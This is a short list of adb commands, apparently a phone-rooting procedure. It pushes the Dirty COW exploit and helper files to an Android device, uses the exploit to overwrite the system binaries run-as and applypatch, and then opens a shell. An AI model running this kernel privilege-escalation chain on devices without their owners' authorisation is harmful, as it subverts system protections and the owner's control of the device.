adb push dirtysanta /storage/emulated/0
adb push boot.img /storage/emulated/0
adb push dirtycow /data/local/tmp
adb push my-run-as /data/local/tmp
adb shell chmod 0777 /data/local/tmp/*
adb shell /data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/my-run-as
adb shell /data/local/tmp/dirtycow /system/bin/applypatch /data/local/tmp/dirtycow
adb shell
